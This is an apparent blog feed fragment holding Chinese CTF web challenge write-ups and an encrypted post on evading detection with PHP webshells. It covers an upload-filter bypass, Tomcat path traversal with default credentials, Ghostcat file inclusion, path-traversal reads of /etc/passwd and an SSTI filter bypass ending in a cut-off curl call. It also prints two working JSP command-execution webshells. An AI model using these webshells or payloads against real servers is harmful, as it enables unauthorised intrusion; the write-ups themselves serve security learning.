4892cd43199c8e0f7b045c45d51cb1350fbc875406ee466627b6507b9e05e273549264d99f1f5f32b07ab3c8f578c0cb656c382a05689986de18e82fe68c6f705b7f35811544fa8b8580746feac7f41e16e4ed2baf9768a11a8636c68a1aeeaaaecb7ec60ad8dffdac2626a710422f60beb2a1a94a3f40fcc919ffebe78f1c52172cbf02c7e549612f658d5a907020891ddf3f99d01dd5a2c0d1f6fe4a0beb3db17d7e2a72127c9f3350d382d04a53b57278fdf4f300c17663ecd0f5a8ececea7ef9ccb2a776aa34cb2b60664518bf8a0063517b5d32cf5a44a69dd2697235df18af6ed7e93d33eb4872537fcda4b4bc8bbb92e8aba95dbd80dcdf28c146781f372bca0b8e77fef2c970df1af888848c0cbde92d79c928afc0a094e9204861e0139241636ac981adafff3cff46e8e2c7cc9a3d2bcb44acec79b1911bec8796804246f6f48437d4cdc192b719e88c35db33bcc2a0593487c78c90876dcd55de46bd11c9905faa28f2dec89b9ce1ae5e9799fe67c8c8d073f7f23f0e6ef7c61d3ce1240214585a2b40003fa04710b7368072fe14a563c77c08f1558d8a19faaee2dc646912ace85837bcca08a5ccef9a6fa9aea4c6589f251cf3d2b6516d905a7a85d0e75ba5bdedf868618ca11d51ee3486ba78b9ff1ecc3d0fc92f617c3f7492a2bd9b2a622f2379329c752356efc3b8fbc51114105dd2e1eabe175ba47ae28aa8be20eaaf1b0c23d668fad917d2e897c89be92110e5f30db2dae959908f5f631fa14b1ed90656a0f3c1c3052b491d74fbdfb14a941bbe6f4e15a22459b24259abe6c6ee65339c38a99c1f4cefe0d14c2dbf8743d7bb680ea1738f958738ccb9a3135b474429de16b3b0c33c81d326be5f271b63e7c82519d178b1c181f75c9f41a4a429879c1fa10d3ca9fd586a7a8cf7f430f8deee8fdc6b6cc9b11c697ac5de8d26d52f3983b88b89a36ba91db14bf8087572ec6076f0275787b82f148f6fc55537b6557f6ed6c0d52eac4fd67e3ac62a11cb870cacadb6d17047694c55ff42c260c0b27a8ef7ab0cf77982be707bf78994fa5973f87f56add932659c8abd658485743cc364c5ecf31d15d67cc586332961013ade194fad1636e962073f20440bfdfffb177b0e997e553bd694da5ad08aaceae09aa0dc04865747806e0c66ceaea27ce6e13dae56745b341c7451bacbf1584ca3189c8862229f9792eef00129b5de54aea063c8de8a2ae4b480322a07a52650162c155f19341c8ed8df8ae103de51b1accae7b0197418b4684b78f7e737588e44e783315487407fa316e104c35d45541ee566c742c9984075e654a9401a4c328a9a1d9b7abef35786d22e3a6f45bae37d73a507486058186c624976fa5ee07d2c2939a4ef0cd57cd31fbfb2327638b5441c4171eb5f895b39fe092f7678126731ee2b6b8b77f4e6ff052d4e20bb18f5ad121e0d37dfd7ce9710bfa97e2015a12c22882c98383d26751460b8e4bc9023bb01b508b6c92725a4942d13e963509340a20e83cfc11cb73bb78ebf5e06c3e2a01e2cd5787418b31a798c3aebdfa602d47fc273c4b6507d3695361860ec86f49ef9ec75519fff81be745b5b587c8820e5a45ee7651cfab3dbb4ae7e1a14a0edc17706fdda036ecb2d5b421baf2bad07d7c11fca788b3ebc36e4f76292a38760875fba4c83a318a4e43e5b4f8a3791afd984cf1133423615226fd94dc1ecafb0abf732b2490bcb542b07a52264f69997633569288f7c43766d147c4feab1fd58603db19c483792d13c2fb0de927b3d5d29975acd076e23a3b65c44e900d434007d4a6df68ac2c4ffde869eb16fc5a6056758104b6da0433da20495746d8a3baac230f0db3e3c993c67ff1350c5a5c8b48e4b2b4aceca1e405056dafafcec97a283dc050436d99ef65f0bac479ba43734c77a3778a8b1d22ff0d57b94933eb24aea9d4c176df27a77deb5262911ff38c3da9de3121cab45c948cf2249a81f918fdfa31ace5f37f316e3f2bd2b729552d20b8dd59fcf41997a3dae024b22ccf07d748e84f7098dc4678ee6fdb38eaedfdbaaea6b57c5ca06f80c1a47d22d3d97c791d432b5f92648d885d4cc43b5a6a838edabf722cb778fe8923ff2db7dbfdf84b11b94bc2ae40a0e7293a765d8a2ecd727f6daa8e367d9cf4df1dc5dc690167aee0ea80b365607bb71b0cac401b3b519f498a8dd5274d7c441e66a249a3db3fd88a1197ba5418b23e68a336310cf0fc5152c7f7cc5231fde4b32f8a3b7929e2fac4e64382dd8c5f9472e3d7f7b8e1e9cfbaf1dd1172e9ef235d1aa1f9df1865f94c404a97edf1c2a31e6ac59b92eb254b262749b1d18e229620f59c4ee1a986aa91ef0cf9a3c05c699b7b1057949dd70c6a51a33b83369e409b386dcf9fb73b72a1b3d9e1ce307cade7cffe25d81eb35bbda6eceadf8e6ff19a6e9dff1731d58ab162c6809f3333c9a876fdc80a772c84aa21dc8cc23ed8fcd076e37cadf85794029d0e425c07a0ab1bce6b1710873fc4c70cf34cc12957724e7d37dc2ebd459f01b4acecf28abccef3cbe858cca26aacb2b014e27c27366152ce5dfabbe8de2ac93497a095768468b6092dddfc67d69a7e57042af8b147e6be70d55f38829a50718802a2021b727ee3d8ea673e42fcfb1054fbb89aa7158a733ec9691f201565d743480a22105342d252ca07e749062ad13547553f5c4c192937b66b4ac482c2716729d5d6f4070ed717862fc7ff00f3cf673d6e2c851aa543b025ac780c464497e20b9198788a319526658b411a8d3d7e10be391e4bcb0b8f3956fed0071a43f58364540845f66b0f20b510702dedee6a0b15a263d2591b944faa4ed276726a8f1af71e6be38607d6a8ceb3ab45a5bb5d190fed04edd9288a034cefab86ec63899cd671c00a1f746d7d138d3065525b30bbdd1861ded9c46747fff233637d2522eae1f6a7c6e47f7a7731389f68b31961f72ba073be50a4b6e27a0aefc8ea885048051ce5afaaebaa0c7504687bf62ba32c16ab8b96e86242e1a33af38411806f1ad711c324fa476676bf280d76762cfc04760c8e2b88cf8de9496800b912e2d09c8687489744ab87c45462dad6ec059e5511614d8437379b99d3f1ce684c8f0b929c54baaf49b491875e44beeaa28934d2119fc6bf21f67ae9191dc1f22f273383835aba75b3929d39f78f6d2a527a8f99a0321f4cf3c295e827b0cd4b824507b747c47ef8cbe5c8ef22efb68e82efd2bf1d660b9000503a7b6eb69ee997ae01a988764e699c94f6836577b919c80fa2ea3c7cc30686697a538e0e25396c6c4b90a0b29e83105dc9b556afad298473cfff7af1f72a02916b91deb30c2cc9f4de4bca2449e7832e50d31ab1767daec23ffa4c77aa542558ca89a06b59385e54ede4943289a9d47257fe566b47e85457c9884a2e63af1c040a725b67a4c2d712f3a74b5e25ffa082bdfb3af1c33178d4b29b335375e1c07ab3b9dda51ba8203608c6ecaf840898fecf7e40ff1601bf43344794a1f8b378cd517bb8ede55dfd3584da7bbd52a7535d2cef161483a68c3ad0cdc6f9c732f16c175cd5f81d517e1b08d328b32ed90a79f4e290c502511e0e21a502a8d7a7379f56f1da10188777d8a96b8fa535cf6b16a970b52178e1dea682e39280ba2979d3c9beeeac1408fe0024e8f5134ffc9538d6daf051a0e03d67fccc5278d89082b35052a27821c2537cf6dc1ce5164c531bab0731bd3d4bd04ea77e022ac3629abf2d43ad894325c0570c752ceb9faa2a1cd332480869c79583a1642220a6ec81f0c2c0bef361b01d6e9b55aa1517b861470660b89cdee73e99d08298056a9c9aaa570317f742ac51b4ab193fb0a61ec69944748e98797cc3e24259b48760b2c1e936bd2eb0bbd9afcbd6f995e34c42df0b985c19884c8574421aa99ee9a87f8684e63b96afc753e08e2e398833f82f4f967650f1c29d7bf619876387264c0f9f322bbcb0af275a731ac2a6f205114fd1382740171e9a053daab359916a7d281b82dcbea677f4c254c0c42e69d238707d418bb9089adc004f9f975327fca16048f41950a43318303549fe7c7c2bc50276ed072af68b2087d1f95c10f5b575014ecc0c979a15133b2f9b8e7f00b8739ff0f23313a729029946aee00721bee6a76d5302410a539ebd29e9a1a612b58e07a328a07b1d980f1a7ed669a199906ba08e70718be22521b09db700954f83891c3c2a49a11365703c567fb7691c3d15a912160a70ce840bee73b97c5d5030adab7ccebd5ee9182d040c23e2e7b00d6acf72aecd00014f22049d6a473daad49145a932ac6b37015d7e34fbb31e206e5e05946a5c0edb829faeba829be1cdb5a382caaa7e3b456b9907b7c92781834f85fa20cf0a6fe71c17464cc77a9ac561fc6dc533d1fdd4f060ff54b0e818ffad94c55813ec29c173a5d7566631bab24378f7f335ecc5ee204fddedcd14a297abe1e5f14c4d4302aece7ed78f1df98cf447215e27c2b4bd961d4525b6471a1ff88c604995832765382c6f533e38e20248a7f96fdb5d60ce3f990bf2c38d31e085a0cdc8f5910f8f9a04d53e527add8f5713f21f99a43accde3a801628b4e1d3ca07e117f57b3bb59670890da7cce069372053acfac13bed3e07fe1814de33c7d2b0b352a01d1ed6edda5849a44cd7532ca23ae215d80bfa4fe1b67957183284cb252144244994e3c42ca39c4c8cf9f5d16d26abd8b7a0625064f16bd1d6a29a2c0a7a8ceb0eeb50a39b343e98c8bf6613bd6bff498151fbb40184bda00c9077ea75753cdbba126f2921bc4b68b3a318ecf2575dd4b09c5e08707aec3e1cdee80cf8b34ef09a52ab56da4094f671ca95fbfeb42916fe52807224b26da098acb030092956796f0503f059ca52d24f4b4fa161251d5c2adcdc354f7f963e25dd5f1658c4d187c5caf09a2d47c4f37ecd6661d4081adaec52c49dd236757c3e7797c68668654a7d801bb758f4e9a6da15808b5af54ff1804f33f869dd75cb660dbb6437e066009408c68bd50815f39cdbc11d7b7996fde672d58a668b027b753c1c5072b45f53a0a2675c4fe1173693f9aec747be0fae2ec60fcdc5fcfe8fd2e20d77db39eed913a27dde382398c76c13e5724659c0867f26dc52a3c839e33b788a092c5853dee4316627449a3b152b41e8f568e29bdbb9466a37f196b8fbca584d060cfb116b0901178926be18d41f4a050735a7128f687d6a620d2f52afb43836fccb0ed877e54fe6486501a5485abc1f755f8fa20837689ce1830f2064115fc765492d96b5535cd5fdb041b81f1a05eb48b8027fc4da34470c166c60b792182ecb399717c9bc692414d9f4abe8476d7faa71a0860f76ae187e7dbb7a10644c777ee142d4af1ffa2ffdb6b954ca0aa545363aa05d0e421c2c36f0cae19bd6304e92c5c9bfe5d1c824efd8f34d91644eb8c70caa2a4ba3fb4b004b93f19b217df1621b8eff51fec35f9e71f616ae8dc5be7d1ad278b41d9ccab700c7bf36b55f897a0a3acc1f128b160466ab2954633c2ace040112b66d504f4943b723e7efb7e0bf49e65fd3ae8776aa487520b6e235f9edc7bc61770d5444092eb9da1499d881220a9dcf140</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="tricks" scheme="http://yoursite.com/categories/tricks/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="D盾免杀PHPWebshell" scheme="http://yoursite.com/tags/D%E7%9B%BE%E5%85%8D%E6%9D%80PHPWebshell/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ-web刷题（四）</title>
    <link href="http://yoursite.com/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>http://yoursite.com/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/</id>
    <published>2020-04-01T14:00:37.000Z</published>
    <updated>2020-04-28T01:23:57.763Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日"><a href="#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日" class="headerlink" title="0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日"></a>0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日</h3><ul><li><p>考点</p><p>php数组特性</p></li><li><p>解题步骤</p></li></ul><ol><li>题目存在源代码泄露，下载UploadFile.class.php.bak,发现使用的是PHP免扩展加密根据这篇文章介绍<a href="https://blog.csdn.net/ababab12345/article/details/90169678，使用解密工具解密，分析源代码定位到关键部分如下：" target="_blank" rel="noopener">https://blog.csdn.net/ababab12345/article/details/90169678，使用解密工具解密，分析源代码定位到关键部分如下：</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(!in_array($filename[count($filename)-1], $this-&gt;allow_ext)) &#123;</span><br><span class="line">        return $this-&gt;error(&#39;只允许上传图片文件&#39;);</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 用.分割文件名，只保留首尾两个字符串，防御Apache解析漏洞</span><br><span class="line">$origin_name &#x3D; current($filename);   &#x2F;&#x2F;返回数组中的当前单元</span><br><span class="line">$ext &#x3D; end($filename);  &#x2F;&#x2F;将数组内部指针指向最后一个元素，并返回该元素的值（如果成功）。</span><br><span class="line">$new_name &#x3D; ($this-&gt;new_name ? $this-&gt;new_name : $origin_name) . &#39;.&#39; . $ext;</span><br><span class="line">$target_fullpath &#x3D; $this-&gt;dist_path . DIRECTORY_SEPARATOR . $new_name;</span><br></pre></td></tr></table></figure><p>判断后缀名是否在白名单中使用了<code>$filename[count($filename) - 1]</code>，而最后字符合成文件名的时候使用了<code>end($filename)</code>。两者的区别是，前者是通过下标来确定，后者则是返回数组的最后一个元素。可以通过数组绕过：</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200401221558883.png" alt></p><p>在跟目录得到flag</p><h3 id="0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="0x 02 [WUSTCTF2020]Train Yourself To Be Godly"></a>0x 02 [WUSTCTF2020]Train Yourself To Be Godly</h3><ul><li><p>考点</p><p>tomcat解析漏洞</p></li><li><p>解题过程</p></li></ul><p>补充知识：apache中的tomcat/webapps目录如下</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/GnhzdO.png" alt></p><p>manage目录是可以上传WAR文件部署服务，也就是说可以通过manage目录实现文件上传，继而实现木马上传</p><p>URL路径参数不规范引发的问题:</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/Gn4FSA.png" alt></p><p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p><p>文章告诉我们可以通过 /..;/manager/html 进入到manager页面</p><ol><li>随便加一串路径，根据报错信息得知当前的tomcat的root路径为examlpes</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403204510802.png" alt></p><ol start="2"><li>访问<code>/..;/manager/html</code>目录穿越到 manager 需要输入密码验证，这里是弱密码 tomcat/tomcat</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403204629584.png" alt></p><p>接下来是后台getshell过程，webshell构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>用<code>jar cvf lxj.war webshell.jsp</code>命令将webshell.jsp打包成war,然后上传文件，发现回显404，根据报错信息明显路径拼结完是example/manager/html/upload，缺少一个/..;/，加一个再试。接着会发现401，未授权访问。是缺少了header里的认证，当然在成功访问后台时抓包也能看到自己的header中有认证头。<br> <code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code>后面就是tomcat:tomcat的base64编码。继续上传，发现403。一般问题就出在cookie或者session没给，www没有目录访问权限身上。按照目前的思路来说，不会出现服务器权限不足的问题，那就只能是cookie没添。利用burpsuit从头开始抓包，在访问/..;/manager/html出现了Set-Cookie(set-Cookie的Path是指此cookie只在Path目录下起作用)，那么我们403的问题就迎刃而解，只需要将/example换成Path参数指定的/manage就行，再把cookie加上就完事了。</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403205226924.png" alt></p><p>最后访问webshell，得到flag</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403205311373.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#train-yourself-to-be-godly-1-solves" target="_blank" rel="noopener">https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#train-yourself-to-be-godly-1-solves</a></p><p><a href="https://www.jianshu.com/p/368d6c41a2f6" target="_blank" rel="noopener">https://www.jianshu.com/p/368d6c41a2f6</a></p></blockquote><h3 id="0x-03-WUSTCTF2020-easyweb"><a href="#0x-03-WUSTCTF2020-easyweb" class="headerlink" title="0x 03 [WUSTCTF2020]easyweb"></a>0x 03 [WUSTCTF2020]easyweb</h3><ul><li><p>考点</p><p>CVE-2020-1938幽灵猫文件包含</p></li><li><p>解题过程</p></li></ul><ol><li>题目打开是一个文件上传，传一个文件上传上去会返回一个之前上传的文件下载，经过测试发现此处存在任意文件读取，可以随意下载：</li></ol><p>尝试WEB-INF下的web.xml:<code>/download?file=../web.xml</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&quot;</span><br><span class="line">         xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_4_0.xsd&quot;</span><br><span class="line">         version&#x3D;&quot;4.0&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;context-param&gt;</span><br><span class="line">        &lt;param-name&gt;webAppRootKey&lt;&#x2F;param-name&gt;</span><br><span class="line">        &lt;param-value&gt;tomcat.ajp&lt;&#x2F;param-value&gt;</span><br><span class="line">    &lt;&#x2F;context-param&gt;</span><br><span class="line"></span><br><span class="line">    &lt;listener&gt;</span><br><span class="line">        &lt;listener-class&gt;</span><br><span class="line">            org.springframework.web.util.WebAppRootListener</span><br><span class="line">        &lt;&#x2F;listener-class&gt;</span><br><span class="line">    &lt;&#x2F;listener&gt;</span><br><span class="line"></span><br><span class="line">    &lt;welcome-file-list&gt;</span><br><span class="line">        &lt;welcome-file&gt;&#x2F;WEB-INF&#x2F;views&#x2F;index.jsp&lt;&#x2F;welcome-file&gt;</span><br><span class="line">    &lt;&#x2F;welcome-file-list&gt;</span><br><span class="line"></span><br><span class="line">    &lt;error-page&gt;</span><br><span class="line">        &lt;exception-type&gt;java.lang.Throwable&lt;&#x2F;exception-type&gt;</span><br><span class="line">        &lt;location&gt;&#x2F;error&lt;&#x2F;location&gt;</span><br><span class="line">    &lt;&#x2F;error-page&gt;</span><br><span class="line">&lt;&#x2F;web-app&gt;</span><br></pre></td></tr></table></figure><p>尝试读取/etc/passwd:<code>/download?file=../../../../../../../etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:101:101::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:102:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:103:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:104:105:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:105:106:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:106:107:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>使用CVE-2020-1938exp（<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py）尝试进行文件读取。成功获取页面" target="_blank" rel="noopener">https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py）尝试进行文件读取。成功获取页面</a></p><blockquote><p>注意由于靶机在内网，所以IP地址是根据Lan Domain确定的，外网IP是内网穿透绑定的</p></blockquote><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403221242014.png" alt></p><p>构造exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*&quot;%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(&quot;Executing command&quot;);</span><br><span class="line">Process p &#x3D; Runtime.getRuntime().exec(&quot;ls &#x2F;&quot;);</span><br><span class="line">OutputStream os &#x3D; p.getOutputStream();</span><br><span class="line">InputStream in &#x3D; p.getInputStream();</span><br><span class="line">DataInputStream dis &#x3D; new DataInputStream(in);</span><br><span class="line">String disr &#x3D; dis.readLine();</span><br><span class="line">while ( disr !&#x3D; null ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr &#x3D; dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>上传成功后利用文件包含执行木马，最后<code>cat /flag78bt787it8b9b098j0k80k0ggg</code>得到flag</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403221421718.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://www.gem-love.com/ctf/2176.html#easyweb" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2176.html#easyweb</a></p><p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves" target="_blank" rel="noopener">https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves</a></p></blockquote><h3 id="0x-04-GWCTF-2019-你的名字"><a href="#0x-04-GWCTF-2019-你的名字" class="headerlink" title="0x 04 [GWCTF 2019]你的名字"></a>0x 04 [GWCTF 2019]你的名字</h3><ul><li><p>考点</p><p>ssti bypass</p></li><li><p>解题过程</p></li></ul><p>经过fuzz,后台强过滤匹配<code></code>，这里可以用if语句绕过。黑名单过滤如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">blacklist &#x3D; [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;, &#39;if&#39;, &#39;for&#39;,</span><br><span class="line">                 &#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;, &#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,</span><br><span class="line">                 &#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;]</span><br><span class="line">for no in blacklist:</span><br><span class="line">    while True:</span><br><span class="line">        if no in s:</span><br><span class="line">            s &#x3D; s.replace(no, &#39;&#39;)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">return s</span><br></pre></td></tr></table></figure><p>这个逻辑是按顺序针对每个关键词过滤，只能应付双写绕过，可以用列表的最后一项来绕过过滤,payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf &#39;&#39;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(&#39;curl 